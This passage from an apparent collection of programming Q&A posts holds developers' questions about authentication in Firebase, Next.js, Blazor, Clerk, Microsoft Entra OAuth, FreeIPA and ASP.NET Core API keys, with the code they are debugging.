    googleProvider.addScope(&quot;profile&quot;);
    googleProvider.addScope(&quot;email&quot;);

    await handleLogin(googleProvider);
  };
</code></pre>
<p>iam not able to fetch the email my login function is this:</p>
<pre><code>const handleLogin = async (signInFunction: any) =&gt; {
    try {
      const result = await signInWithPopup(auth, signInFunction);
      // setUser(result.user);
      console.log(&quot;set user&quot;, setUser);

      console.log(`${signInFunction.providerId} user `, result.user);

      

      // Get the ID token directly
      const idToken = await result.user.getIdToken();
      console.log(&quot;idtoken is : &quot;, idToken);

      // Extract relevant information from the authentication result
      const { uid, displayName, email ,photoURL } = result.user;
      console.log(&quot;this is uid :&quot;, uid);

      // Create an object with the data you want to send to the backend
      const userData = {
        id: uid,
        displayName: displayName,
        email: email,
        photoURL: photoURL,
      };

      // Make a POST request to your backend using the Fetch API
      const postResponse = await fetch(`${accountServiceBackendUrl}/users`, {
        method: &quot;POST&quot;,
        headers: {
          &quot;Content-Type&quot;: &quot;application/json&quot;,
          Authorization: `Bearer ${idToken}`,
        },
        body: JSON.stringify(userData),
      });

      if (postResponse.ok) {
        console.log(&quot;User data sent to backend successfully&quot;);
        console.log(&quot;user authenticated from backend means.&quot;);
        setUser(result.user);
        console.log(&quot;this is the after user :&quot;, setUser);
        console.log(&quot;user data&quot;, userData);

        setDbUser(true);
      } else {
        console.error(&quot;Error sending user data to backend:&quot;, postResponse.statusText);
      }

      // Make a GET request to your backend using the Fetch API for single user
      const SingleUser = await fetch(`${accountServiceBackendUrl}/users/${uid}`, {
        method: &quot;GET&quot;,
        headers: {
          &quot;Content-Type&quot;: &quot;application/json&quot;,
          Authorization: `Bearer ${idToken}`,
        },
      });

      if (SingleUser.ok) {
        const SingleUserData = await SingleUser.json();
        console.log(&quot;User data received from backend successfully as a single user&quot;, SingleUserData);
        setDbUser(true);
      } else {
        console.error(&quot;Error fetching user data from backend:&quot;, SingleUser.statusText);
      }

      // Make a GET request to retrieve user information after login
      const getResponse = await fetch(`${accountServiceBackendUrl}/users`, {
        method: &quot;GET&quot;,
        headers: {
          &quot;Content-Type&quot;: &quot;application/json&quot;,
          Authorization: `Bearer ${idToken}`,
        },
      });

      if (getResponse.ok) {
        const getUserData = await getResponse.json();
        console.log(&quot;User data received from backend:&quot;, getUserData);
        setDbUser(true);
      } else {
        console.error(&quot;Error fetching user data from backend:&quot;, getResponse.statusText);
      }
    } catch (error) {
      console.error(&quot;Error during authentication or fetch:&quot;, error);
    }
  };
</code></pre>
<p>i tried reading the docs but still iam not able to find any solution. please help!</p>
"
"<p>I am trying to create a login for one of the web sites: &quot;https://mediamarkt.pl&quot;. Unfortunately I am getting an 403 error. Can you please help with this case?</p>
<p>Here is my code:</p>
<pre><code>import requests



s = requests.Session()

user_agent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&quot;

headers = {

    'Authority':'mediamarkt.pl',
    'Method':'POST',
    'Path': '/api/v1/msg',
    'User-Agent': user_agent,
    'Content-Type': 'application/json',
    'Referer': 'https://mediamarkt.pl/pl/myaccount/auth/login?redirectURL=%2F',
}


def login_site(email, password):

    login_url = 'https://mediamarkt.pl/api/v1/msg'
    form_data = {
        'email': email,
        'password': password,
        'mms-login-form__login-button':'Zaloguj się',
        }
    login = s.post(login_url, data=form_data, headers=headers)

    if login.status_code == 200:
        print(&quot;Login successful!&quot;)
        print(&quot;Server response:&quot;)
        print(login.text)
    else:
        print(f&quot;Login error. Response status: {login.status_code}&quot;)


email = &quot;XYZ@gmail.com&quot;

password = &quot;XYZ123!&quot;

login_site(email, password)
</code></pre>
<p>I've tried to add some other headers... still 403 error.</p>
"
"<p>I am currently working on one of my project which is mainly focused on Nextjs api router (I've mainly used node with express in the past)
I'm trying to auth a user using pocketbase as my custom database.
I'm doing user auth using email and password and then storing the user data in a session as following:</p>
<pre><code>import { encrypt } from &quot;@/lib/actions&quot;;
import { db } from &quot;@/pocketbase&quot;;
import { NextResponse, NextRequest } from &quot;next/server&quot;;
import { serialize } from 'cookie'

export async function POST(request: NextRequest) {
    try {
        const values = await request.json();
        const { record } = await db.collection(&quot;users&quot;).authWithPassword(values.email, values.password);
        const expires = new Date(Date.now() + 30 * 1000 * 60 * 24);
        /* the encrypt function mainly just to sign a JWT contract */
        const session = await encrypt({ record, expires });
        const response = NextResponse.json({ session }, {
            status: 200, headers: {
                'Set-Cookie': serialize('session', session, { expires })
            }
        });
        return response;
    } catch (err: any) {
        return NextResponse.json({ message: err.message }, { status: 400 })
    }
}
</code></pre>
<p>My problem is that the cookie won't be sent back to the client at all and whenever I'm trying any diffrent approuch of sending the cookie it also won't work</p>
<p>Its been a few hours already and I'm frustrated by this</p>
<p>For more context: I'm trying to then access the session by this getSession helper function:</p>
<pre><code>export async function getSession() {
    const session = cookies().get('session')?.value;
    if (!session) return null;
    return await decrypt(session);
}
</code></pre>
<p>And then I'm trying to access it in an AuthProtected Component:</p>
<pre><code>import { getSession } from &quot;@/lib/actions&quot;;
import { redirect } from &quot;next/navigation&quot;;

export default async function AuthProtected({ children }: { children: React.ReactNode }) {
    const session = await getSession();
    console.log(session);
    return &lt;&gt;{children}&lt;/&gt;
}
</code></pre>
<p>I'm getting <code>null</code> in the server console</p>
<p>I appriciate any solution or if I've made some kind of mistake I will be gald to take any sort of reviews for my code :)</p>
<p>Thanks</p>
"
"<p>This is what is in my Program.cs:</p>
<pre><code>// Add services to the container.
builder.Services.AddRazorComponents()
    .AddInteractiveServerComponents();
</code></pre>
<p>This is my custom authstateprovider:</p>
<pre><code>    private readonly HttpClient _htttpClient;
    private readonly ILocalStorageService _localStorage;

    public AuthStateProvider(
        HttpClient httpClient,
        ILocalStorageService localStorage
    )
    {
        _htttpClient = httpClient;
        _localStorage = localStorage;
    }

    public override async Task&lt;AuthenticationState&gt; GetAuthenticationStateAsync()
    {
        var anonymousState = new AuthenticationState(new ClaimsPrincipal(new ClaimsIdentity()));

        try
        {
            var token = await _localStorage.GetItemAsync&lt;string&gt;(Account.Token);

            if (token == null)
            {
                return anonymousState;
            }

            _htttpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue(&quot;bearer&quot;, token);

            return new AuthenticationState(new ClaimsPrincipal(Utils.SplitRole(token)));
        }
        catch
        {
            return anonymousState;
        }
    }
</code></pre>
<p>It is always throwing an exception when i start the app and the login function doesn't works.</p>
<p>The error is: &quot;System.InvalidOperationException : 'JavaScript interop calls cannot be issued at this time. This is because the component is being statically rendered. When prerendering is enabled, JavaScript interop calls can only be performed during the OnAfterRenderAsync lifecycle method.'&quot;</p>
<p>I try to put this <code>@rendermode InteractiveServer</code> and this:</p>
<pre><code>protected override async Task **OnAfterRenderAsync**(bool firstRender)
{
    if (firstRender)
    {
        await GetNotification();
        StateHasChanged();
    }
}

private async Task GetNotification()
{
    Notification = await _localStorage.GetNotification();
}
</code></pre>
<p>in my singIn but it does not resolve the problem. And the problem when I start the app is not solve either.</p>
<p>.net 8 has new rules? What can I do to make this works?</p>
"
"<p>I've been trying to test out the Clerk's Migration script with some dummy users and a test Clerk project. However, I keep getting this error called status 422, where it says that form data is missing. I've checked and double checked my JSON file inputs, the index.ts code and cannot seem to figure out where the missing data can be. Has anyone ever dealt with this issue before or knows a way to fix it?</p>
<p>Here is the exact error message from the migration log:</p>
<pre><code>{
  &quot;userId&quot;: &quot;89&quot;,
  &quot;status&quot;: 422,
  &quot;clerkTraceId&quot;: &quot;41cfcb7bd30342c6ed60c4efe65a5a6b&quot;,
  &quot;clerkError&quot;: true,
  &quot;errors&quot;: [
    {
      &quot;code&quot;: &quot;form_data_missing&quot;,
      &quot;message&quot;: &quot;missing data&quot;,
      &quot;meta&quot;: {}
    }
  ],
  &quot;originalLine&quot;: 155,
  &quot;originalColumn&quot;: 12
}

</code></pre>
<p>Here is the code for my users.json file (just one user):</p>
<pre><code>[
  {
    &quot;externalId&quot;: &quot;89&quot;,
    &quot;email&quot;: &quot;user89@example.com&quot;,
    &quot;firstName&quot;: &quot;User89&quot;,
    &quot;lastName&quot;: &quot;Lastname89&quot;,
    &quot;password&quot;: &quot;$2a$12$9HhLqMJxqBKhlZasxjlhger67GFcC4aOAtpcU.THpcSLiQve4mq6.&quot;,
    &quot;passwordHasher&quot;: &quot;bcrypt&quot;
  }
]
</code></pre>
<p>Here is the index.ts code:</p>
<pre><code>import { config } from &quot;dotenv&quot;;
config();

import * as fs from &quot;fs&quot;;
import * as z from &quot;zod&quot;;
import clerkClient from &quot;@clerk/clerk-sdk-node&quot;;
import ora, { Ora } from &quot;ora&quot;;

const SECRET_KEY = process.env.CLERK_SECRET_KEY;
const DELAY = parseInt(process.env.DELAY_MS ?? `1_000`);
const RETRY_DELAY = parseInt(process.env.RETRY_DELAY_MS ?? `10_000`);
const IMPORT_TO_DEV = process.env.IMPORT_TO_DEV_INSTANCE ?? &quot;false&quot;;
const OFFSET = parseInt(process.env.OFFSET ?? `0`);

if (!SECRET_KEY) {
  throw new Error(
    &quot;CLERK_SECRET_KEY is required. Please copy .env.example to .env and add your key.&quot;
  );
}

if (SECRET_KEY.split(&quot;_&quot;)[1] !== &quot;live&quot; &amp;&amp; IMPORT_TO_DEV === &quot;false&quot;) {
  throw new Error(
    &quot;The Clerk Secret Key provided is for a development instance. Development instances are limited to 500 users and do not share their userbase with production instances. If you want to import users to your development instance, please set 'IMPORT_TO_DEV_INSTANCE' in your .env to 'true'.&quot;
  );
}

const userSchema = z.object({
  externalId: z.string(),
  email: z.string().email(),
  firstName: z.string().optional(),
  lastName: z.string().optional(),
  password: z.string().optional(),
  passwordHasher: z
    .enum([
      &quot;argon2i&quot;,
      &quot;argon2id&quot;,
      &quot;bcrypt&quot;,
      &quot;md5&quot;,
      &quot;pbkdf2_sha256&quot;,
      &quot;pbkdf2_sha256_django&quot;,
      &quot;pbkdf2_sha1&quot;,
      &quot;scrypt_firebase&quot;,
    ])
    .optional(),
});

type User = z.infer&lt;typeof userSchema&gt;;

const createUser = (userData: User) =&gt;
  userData.password
    ? clerkClient.users.createUser({
        externalId: userData.externalId,
        emailAddress: [userData.email],
        firstName: userData.firstName,
        lastName: userData.lastName,
        password: userData.password
      })
    : clerkClient.users.createUser({
        externalId: userData.externalId,
        emailAddress: [userData.email],
        firstName: userData.firstName,
        lastName: userData.lastName,
        skipPasswordRequirement: true,
      });

const now = new Date().toISOString().split(&quot;.&quot;)[0]; // YYYY-MM-DDTHH:mm:ss
function appendLog(payload: any) {
  fs.appendFileSync(
    `./migration-log-${now}.json`,
    `\n${JSON.stringify(payload, null, 2)}`
  );
}

let migrated = 0;
let alreadyExists = 0;

async function processUserToClerk(userData: User, spinner: Ora) {
  const txt = spinner.text;
  try {
    const parsedUserData = userSchema.safeParse(userData);
    if (!parsedUserData.success) {
      throw parsedUserData.error;
    }
    await createUser(parsedUserData.data);

    migrated++;
  } catch (error) {
    if (error.status === 422) {
      console.log(error)
      appendLog({ userId: userData.externalId, ...error });
      alreadyExists++;
      return;
    }

    // Keep cooldown in case rate limit is reached as a fallback if the thread blocking fails
    if (error.status === 429) {
      spinner.text = `${txt} - rate limit reached, waiting for ${RETRY_DELAY} ms`;
      await rateLimitCooldown();
      spinner.text = txt;
      return processUserToClerk(userData, spinner);
    }

    appendLog({ userId: userData.externalId, ...error });
  }
}

async function cooldown() {
  await new Promise((r) =&gt; setTimeout(r, DELAY));
}

async function rateLimitCooldown() {
  await new Promise((r) =&gt; setTimeout(r, RETRY_DELAY));
}

async function main() {
  console.log(`Clerk User Migration Utility`);

  const inputFileName = process.argv[2] ?? &quot;users.json&quot;;

  console.log(`Fetching users from ${inputFileName}`);

  const parsedUserData: any[] = JSON.parse(
    fs.readFileSync(inputFileName, &quot;utf-8&quot;)
  );

  const offsetUsers = parsedUserData.slice(OFFSET);
  console.log(
    `users.json found and parsed, attempting migration with an offset of ${OFFSET}`
  );

  let i = 0;
  const spinner = ora(`Migrating users`).start();

  for (const userData of offsetUsers) {
    spinner.text = `Migrating user ${i}/${offsetUsers.length}, cooldown`;
    await cooldown();
    i++;
    spinner.text = `Migrating user ${i}/${offsetUsers.length}`;
    await processUserToClerk(userData, spinner);
  }

  spinner.succeed(`Migration complete`);
  return;
}

main().then(() =&gt; {
  console.log(`${migrated} users migrated`);
  console.log(`${alreadyExists} users failed to upload`);
  console.log(alreadyExists)
});

</code></pre>
"
"<p>How to maintain the state of AuthenticationStateProvider in Blazor server mode when refreshing the page?</p>
<p>The status is cleared when I refresh the browser page and I need to log in again. I hope to keep the status and not be logged out.</p>
"
"<p>I am trying to use wandb on a institution managed HPC system. Unfortunately internet is not available by default (probably blocked by firewall).</p>
<p>When I have requested a way for me to use wandb, they have asked me to provide the <strong>IP and port</strong> and they might be able to help.</p>
<p>I was wondering if anyone knows what should be the IP/port that wandb uses when sending the data and authentication request.</p>
"
"<p>There are two steps in getting a refresh_token.
The first step is to get a code from <a href=""https://login.microsoftonline.com/common/oauth2/v2.0/authorize"" rel=""nofollow noreferrer"">https://login.microsoftonline.com/common/oauth2/v2.0/authorize</a> endpoint.
The second step is to exchange the code you get from step 1 to get the refresh_token from the <a href=""https://login.microsoftonline.com/common/oauth2/v2.0/token"" rel=""nofollow noreferrer"">https://login.microsoftonline.com/common/oauth2/v2.0/token</a> endpoint.</p>
<p>If I set the type of redirect_uri to web on entra.microsoft.com, then the first step works, but the second step would return an error saying that: AADSTS90023: Cross-origin token redemption is permitted only for the 'Single-Page Application'.</p>
<p>If I set the type of redirect_uri to Single-page application on entra.microsoft.com, then the first step errors with error_description: Proof Key for Code Exchange is required for cross-origin authorization code redemption.</p>
<p>Any ideas to get the refresh_token from microsoft login?</p>
"
"<p>I’m currently working on a NextJS app (app router) and went with Clerk for authentication using their <code>@clerk/nextjs</code> (4.29.7) package.</p>
<p>Everything works great until the internet connection is interrupted. As Clerk works with very short-lived access tokens, it requests a new token every minute or so. Obviously, as soon as the internet connection is lost, the next request will fail and lead first to</p>
<pre><code>clerk.browser.js:2 
POST https://**********.clerk.accounts.dev/v1/client/sessions/sess_2cy4a…9vLkBPD4GVFExWN5Dc-nMoU8VxlNWAbb4w3X6ELJ7xw7OIG5X68F6Rm86nnbnzgrNQctoOKnFA net::ERR_INTERNET_DISCONNECTED
</code></pre>
<p>leading up to the following error:</p>
<pre><code>clerk.browser.js:2
Uncaught (in promise) Error: ClerkJS: Token refresh failed (error='Cannot read properties of null (reading 'jwt')')
    at p (clerk.browser.js:2:74485)
    at h.handleGetTokenError (clerk.browser.js:2:192240)
    at h.refreshSessionToken (clerk.browser.js:2:191543)
    at async Object.acquireLockAndRun (clerk.browser.js:2:140446)
</code></pre>
<p>This is, for example, the case when you close your laptop on the app and re-open it to resume your session later. Having the app break and not try to redirect to sign in or re-try to fetch a new token is rather unfortunate.</p>
<p>I tried to find a way to catch and handle that error or prevent it in the first place by stopping the requests when offline, but I didn’t find any way to do it. There seems to be nothing on that in the docs, and I’m surprised no one seems to have struggled with that so far.</p>
<p>I’d appreciate any ideas or insights on how to deal with this.
Thanks in advance! 🙏</p>
"
"<p>After using Next=auth's the google provider to authenticate myself, I get the redirect callback url which is <code>http://localhost:3000/api/auth/callback/google?state=....</code> which shows up on the browser for a split second as a ERR_INVALID_URL page and then redirects me to the homepage of my application. I want the user to have an intermediate page such as a loading screen so that they would not see an invalid page even for split second.</p>
"
"<p>I am working on a Python application which uses FreeIPA to authenticate users. Once they got logged in, I assume there is a possiblity that one of users may be removed from FreeIPA when they are logged in in my application.</p>
<p>Is there a way to receive a notification from FreeIPA that the logged in user was removed from FreeIPA and therefore his session needs to be expired?</p>
"
"<p>My problem is to find a way where I can successfully Login with the OAuth2.0 of Microsoft.</p>
<p>I have three php files. In the Index.php you will automatically move to the auth.php where you have to Login with Microsoft. The Autorization code will send to the success.php, where you get the Access Token. That is what I expect. I use Entra ID for it, so I replaced some things with 'XXXXXXXX'.</p>
<p>There is also a local Login, but thats not the Problem. The important thing is the authentication with Microsoft OAuth2.0 and Entra ID.</p>
<p>Index.php</p>
<pre><code>&lt;?php
//TODO: Azure Synchronisation 

session_start();


//* Überprüfen, ob der Benutzer authentifiziert ist
if (isset($_SESSION['token'])) 
{
    header('Location: http://localhost/success.php');  //! Der Benutzer ist bereits authentifiziert
    exit();
}
else
{
header('Location: http://localhost/auth.php');  //! Der Benutzer ist bereits authentifiziert
exit();
}
     
//* Überprüfen, ob der Benutzer bereits mit einem Office-Dienst verbunden ist
if (isset($_SERVER['AUTH_USER'])) 
{
/*sleep(1);
header('Location: http://localhost/success.php'); //! Der Benutzer ist bereits angemeldet
exit();*/
}



require_once($_SERVER['DOCUMENT_ROOT'].'/Assets/Configs/server.php'); //*Einbinden von server.php
 

if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) 
    {
        $username = $_POST['uid'];
        $password = $_POST['pwd'];

        //* Datenbankverbindung aufbauen
        $connectionInfo = array(&quot;UID&quot; =&gt; $uid, &quot;PWD&quot; =&gt; $pwd, &quot;Database&quot; =&gt; $databaseName, &quot;CharacterSet&quot; =&gt; $CharacterSet);
        $conn = sqlsrv_connect($serverName, $connectionInfo);

        if ($conn) 
        {
            $enteredUsername = $_POST['uid'];
            $enteredPassword = $_POST['pwd'];
            $hashedEnteredPassword = hash('sha256', $enteredPassword); //!Passwort wird gehashed

            $query = &quot;SELECT * FROM Benutzer WHERE Benutzername=?&quot;;
            $params = array($enteredUsername);
            $options = array(&quot;Scrollable&quot; =&gt; SQLSRV_CURSOR_STATIC);
            $stmt = sqlsrv_query($conn, $query, $params, $options);

            if ($stmt === false) 
            {
                die(&quot;&lt;font color='red'&gt;&lt;b&gt;Abfragefehler:&lt;/b&gt;&lt;/font&gt; &quot; . print_r(sqlsrv_errors(), true));
            }

            $row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC);

            if ($row) 
            {
                if ($hashedEnteredPassword == $row['HashedPasswort']) 
                {
                    
                    $_SESSION['user']=$row['Benutzername'];
                    $message = &quot;&lt;font color='green'&gt;&lt;b&gt;Sie wurden erfolgreich eingeloggt!&lt;/b&gt;&lt;/font&gt;&quot;;
                    echo &quot;Gehashtes Passwort aus der Datenbank: &quot; . $row['HashedPasswort'];
                    header(&quot;Location: success.php&quot;);
                    exit();
                } 
                else 
                {
                    $message = &quot;&lt;font color='black'&gt;&lt;b&gt;Ihr Benutzername oder Passwort ist falsch. Versuchen Sie es erneut&lt;/b&gt;&lt;/font&gt;&quot;;
                }
            } 
            else 
            {
                $message = &quot;&lt;font color='black'&gt;&lt;b&gt;Ihr Benutzername oder Passwort ist falsch. Versuchen Sie es erneut&lt;/b&gt;&lt;/font&gt;&quot;;
            }

            sqlsrv_free_stmt($stmt);
            sqlsrv_close($conn);
        } 
        else 
        {
            die(&quot;&lt;font color='red'&gt;&lt;b&gt;Verbindung fehlgeschlagen:&lt;/b&gt;&lt;/font&gt; &quot; . print_r(sqlsrv_errors(), true));
        }
    }
?&gt;

&lt;head&gt;
    &lt;title&gt;ITH - Development Test&lt;/title&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;Css.css&quot;&gt;
    &lt;script src=&quot;Js.js&quot;&gt;&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;header&gt;
        &lt;div id=&quot;Überschrift&quot;&gt;
            &lt;h1&gt;ITH Bolting Technology - Login&lt;/h1&gt;
        &lt;/div&gt;
        &lt;h4&gt;Diese Seite dient zum Einloggen - This page is for Logging in&lt;/h4&gt;
        &lt;h4&gt;Bitte geben Sie ihre Login-Daten ein - Please enter your Login-data&lt;/h4&gt;
        &lt;?php
            if(isset($message))
            {   
                echo $message; 
            }
        ?&gt;
    &lt;/header&gt;
    &lt;main&gt;
        &lt;div id=&quot;Anmeldung&quot;&gt;
                &lt;form method=&quot;post&quot; action=&quot;index.php&quot;&gt;
                    &lt;label for=&quot;uid&quot;&gt;&lt;b&gt;Benutzername - Username&lt;/b&gt;&lt;/label&gt;
                    &lt;input type=&quot;text&quot; placeholder=&quot;Benutzername eingeben&quot; name=&quot;uid&quot; required&gt;
                    
                    &lt;label for=&quot;pwd&quot;&gt;&lt;b&gt;Passwort - Password&lt;/b&gt;&lt;/label&gt;
                    &lt;input type=&quot;password&quot; placeholder=&quot;Passwort eingeben&quot; name=&quot;pwd&quot; required&gt;
                    &lt;button type=&quot;submit&quot; value=&quot;Login&quot;&gt;
                        Einloggen - Login
                    &lt;/button&gt;
                  
                &lt;/form&gt;
       
        &lt;/div&gt;
    &lt;/main&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>auth.php</p>
<pre><code>&lt;?php
session_start();

// Überprüfen, ob der Benutzer bereits authentifiziert ist
if (isset($_SESSION['token'])) {
    header('Location: http://localhost/success.php');
    exit();
}

// Include der erforderlichen Bibliotheken
require_once __DIR__.'/vendor/autoload.php';

// Konfiguration für Azure AD OAuth2-Provider
$clientId = 'XXXXXXXXXXXXXXXXX';
$clientSecret = 'XXXXXXXXXXXXXXXXX';
$redirectUri = 'http://localhost/success.php'; // Ändern Sie dies entsprechend Ihrer Konfiguration
$tenantId = 'XXXXXXXXXXXXXXXXX';
$scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/profile https://graph.microsoft.com/email https://graph.microsoft.com/offline_access';



$provider = new \League\OAuth2\Client\Provider\GenericProvider([
    'clientId'                =&gt; $clientId,
    'clientSecret'            =&gt; $clientSecret,
    'redirectUri'             =&gt; $redirectUri,
    'urlAuthorize'            =&gt; &quot;https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize&quot;,
    'urlAccessToken'          =&gt; &quot;https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token&quot;,
    'urlResourceOwnerDetails' =&gt; '',
    'scopes'                  =&gt; $scope, // Ändern Sie die Bereiche entsprechend Ihren Anforderungen
    'enablePkce' =&gt; true
]);


$authorizationUrl = $provider-&gt;getAuthorizationUrl();

$_SESSION['oauth2state'] = $provider-&gt;getState();

header('Location: ' . $authorizationUrl);
exit();
?&gt;

</code></pre>
<p>success.php</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;DE&quot;&gt;

&lt;?php
session_start();
$username = $_SESSION['user'];
$Erfolg =&quot;Sie haben sich erfolgreich angemeldet&quot;;

// Extrahiere den Autorisierungscode aus der URL
$authorization_code = isset($_GET['code']) ? $_GET['code'] : null;
?&gt;

    &lt;head&gt; 
        &lt;meta charset=&quot;UTF-8&quot;&gt;
        &lt;link rel=&quot;stylesheet&quot; href=&quot;Css2.css&quot;&gt;
        &lt;script src=&quot;Js.js&quot;&gt;&lt;/script&gt;
        &lt;title&gt;
            Erfolg
        &lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;header&gt;
            &lt;div id=&quot;Überschrift&quot;&gt;
                &lt;h1&gt;ITH Bolting Technology - Login&lt;/h1&gt;
                &lt;?php
                    echo &quot;Benutzer: &quot;;
                    echo($username);
                ?&gt;
            &lt;/div&gt;
        &lt;/header&gt;
        &lt;main&gt;
            &lt;h3&gt;

&lt;?php

$Erfolg =&quot;Sie haben sich erfolgreich angemeldet&quot;;

// Guzzle HTTP Client 
require_once __DIR__.'/vendor/autoload.php';
$clientId = 'XXXXXXXXXXXXXXXXX';
$clientSecret = 'XXXXXXXXXXXXXXXXX';
$redirectUri = 'http://localhost/success.php'; // Ändern Sie dies entsprechend Ihrer Konfiguration
$tenantId = 'XXXXXXXXXXXXXXXXX';
$scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/profile https://graph.microsoft.com/email https://graph.microsoft.com/offline_access';

$provider = new \League\OAuth2\Client\Provider\GenericProvider([
    'clientId'                =&gt; $clientId,
    'clientSecret'            =&gt; $clientSecret,
    'redirectUri'             =&gt; $redirectUri,
    'urlAuthorize'            =&gt; &quot;https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize&quot;,
    'urlAccessToken'          =&gt; &quot;https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token&quot;,
    'urlResourceOwnerDetails' =&gt; '',
    'scopes'                  =&gt; $scope // Ändern Sie die Bereiche entsprechend Ihren Anforderungen
]);

// Autorisierungscode aus der URL-Parameter erhalten
$authorizationCode = isset($_GET['code']) ? $_GET['code'] : null;

if (!$authorizationCode) {
    exit('Authorization code not provided.');
}

try {
    // Zugriffstoken anfordern
    $accessToken = $provider-&gt;getAccessToken('authorization_code', ['code' =&gt; $authorizationCode]);

    // Zugriffstoken erhalten
    $accessTokenValue = $accessToken-&gt;getToken();

    // Informationen über Benutzer abrufen
    $graph = new Microsoft\Graph\Graph();
    $graph-&gt;setAccessToken($accessTokenValue);
    $user = $graph-&gt;createRequest('GET', '/me')
                  -&gt;setReturnType(Microsoft\Graph\Model\User::class)
                  -&gt;execute();

    // Benutzerinformationen anzeigen
    echo 'Benutzername: ' . $user-&gt;getDisplayName();
    echo 'E-Mail: ' . $user-&gt;getMail();

} catch (\League\OAuth2\Client\Provider\Exception\IdentityProviderException $e) {
    exit('Failed to get access token: ' . $e-&gt;getMessage());
}

// Überprüfen, ob die Anzahl der Benutzer in der Session vorhanden ist
    /*if (isset($_SESSION['user_count'])) {
        echo &quot;&lt;p&gt;Anzahl der Benutzer aus Azure AD: &quot; . $_SESSION['user_count'] . &quot;&lt;/p&gt;&quot;;
    } else {
        echo &quot;&lt;p&gt;Es wurden keine Benutzer abgerufen.&lt;/p&gt;&quot;;
    }*/

?&gt;

            &lt;/h3&gt; 
            &lt;div id=&quot;authCode&quot;&gt;
                &lt;?php
                    if ($authorization_code) 
                    {
                        
                         // Autorisierungscode auf der Seite anzeigen
                         echo &quot;&lt;script&gt;document.addEventListener('DOMContentLoaded', function() {
                            document.getElementById('authCode').textContent = 'Autorisierungscode: $authorization_code';
                        });&lt;/script&gt;&quot;;
                    }
                ?&gt;
            &lt;/div&gt; 
        &lt;/main&gt;
    &lt;/body&gt;

&lt;/html&gt;

</code></pre>
"
"<p>After implementing on closing browser tab to call a logout API, I came across this issue on production mode:</p>
<pre><code>result = (GlobalErrors)_licensing.RemoveSessionFromDB(User.FindFirstValue(ClaimTypes.Sid));
</code></pre>
<p><code>User.Claims</code> becomes null/Empty, but when I log out properly from my application it isn't.</p>
<p>Any ideas or why this problem is occurring or if there is any optimal solutions?</p>
"
"<p>I employ phone and Google/Apple auth in an app and I require both - phone along with Google or Apple (depending on device).</p>
<p>I have a use case where an an Apple user switches devices to an Android device, logs in via phone auth, and is prompted to Link his Firebase User to Google Auth (presumably the user switched devices or just has this device and uses it).</p>
<p>In this process, I get a <code>GoogleSignInAccount</code> <code>googleUser</code> just fine, and I can link that account no problem.</p>
<p>However, if that <code>googleUser</code> already had a separate Firebase Account, I don't know that, and linking them deletes the original Firebase Account of that <code>googleUser</code>.  Perhaps this user phone auth's on his wife's device. We don't want him linking in this case, he'll delete his wife's firebase user.</p>
<p>I want to determine if there is a Firebase Account associated with the <code>googleUser</code>, and I don't know how to determine this, short of signing in the user with that google credential. I don't want to do that, because I have a current user logged in, which I'll be linking.</p>
<p>I already check for existing user by email, but with Apple anonymous or any different email, this is insufficient.</p>
<p>How can I check for an existing Firebase User from a <code>GoogleSignInAccount</code> object without logging out my current user?</p>
"
"<p>Given the scenario below, I don't understand why I need to add a scope under the &quot;Expose an API&quot; section of a application registration in Microsoft Entra ID.</p>
<ol>
<li>Client logs in to frontend SPA using Microsoft Entra ID and is provided a bearer token.</li>
<li>Client calls my backend API and provides bearer token.</li>
<li>Backend API validates the token and confirms user has a specific role by decoding the JWT.</li>
<li>Backend API connects to MS SQL database to retrieve data and sends it back to client.</li>
</ol>
<p>In this scenario, my backend does not need to access MS Graph directly. I just want the API to be protected via the validation of the bearer token.</p>
<p>However, all the instructions I find, include creating a API scope and granting application permissions to specific roles. Isn't this only necessary if your backend API needs to request MS Graph resources directly?</p>
"
"<p>I have an ASP.NET Core 3.1 Web API project that has no security enforced. Now I need to secure it with an API key based authentication scheme.</p>
<p>The basic idea is to let the clients of this Web API pass in an API key in a header, then all the client API keys will be held in the <code>appsettings.json</code> file.</p>
<p>These are the implementation details:</p>
<ol>
<li>Setup a customized <code>ApiKeyAuthenticationOptions</code> where <code>MyConfigValue</code> will be used to hold the keys</li>
</ol>
<pre><code>    public class ApiKeyAuthenticationOptions : AuthenticationSchemeOptions
    {
        public const string DefaultScheme = &quot;ApiKey&quot;;
        public string Scheme =&gt; DefaultScheme;
        public string AuthenticationType = DefaultScheme;
        public string MyConfigValue { get; set; }
    }
</code></pre>
<ol start=""2"">
<li>In startup, the authentication logic is added to service collection</li>
</ol>
<pre><code>    public void ConfigureServices(IServiceCollection services)
    {
            services.AddSingleton(Configuration);
         services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
             .AddApiKeyAuthentication(Configuration);
         services.AddControllers();
    }
</code></pre>
<ol start=""3"">
<li>The extension method of <code>AuthenticationBuilder</code> is defined as</li>
</ol>
<pre><code>    public static AuthenticationBuilder AddApiKeyAuthentication(this AuthenticationBuilder builder, IConfiguration configuration)
    {
        var config = configuration[&quot;MyConfigValue&quot;];
        builder.Services.Configure&lt;ApiKeyAuthenticationOptions&gt;(options =&gt;
        {
            options.MyConfigValue = config;
        });

        builder.AddScheme&lt;ApiKeyAuthenticationOptions, ApiKeyAuthenticationHandler&gt;(ApiKeyAuthenticationOptions.DefaultScheme, options =&gt; { });

        return builder;
    }
</code></pre>
<ol start=""4"">
<li>The authentication handler is defined as</li>
</ol>
<pre><code>    public class ApiKeyAuthenticationHandler : AuthenticationHandler&lt;ApiKeyAuthenticationOptions&gt;
    {
        private const string ApiKeyName = &quot;X-Api-Key&quot;;

